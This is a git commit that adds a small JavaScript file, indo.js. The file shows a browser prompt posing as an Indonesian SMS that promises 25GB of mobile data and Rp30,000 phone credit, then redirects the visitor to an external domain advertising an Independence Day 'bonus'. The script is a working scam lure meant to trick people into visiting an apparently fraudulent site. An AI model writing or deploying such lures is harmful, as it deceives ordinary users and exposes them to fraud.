c500c63bda10e33b08082060c69213d94a93d4f1
weallneedgod <darter-deaths2p@icloud.com>
2026-08-14 12:13:38 -1200

    Create indo.js

---
+++ indo.js
@@ -0,0 +1,10 @@
+
+    var password = '25GB DATA + Pulsa Rp30,000';
+password = prompt(
+'SMS: Selamat! Anda berhak menerima 25GB DATA + Pulsa Rp30,000. Klik OK untuk mengaktifkannya sekarang.','25GB DATA + Pulsa Rp30,000'
+
+);if (password != '25GB DATA + Pulsa Rp30,000') {
+
+    location.href = 'https://www.ebemagraete.ink/bonus-perayaan-hari-kemerdekaan';
+
+}
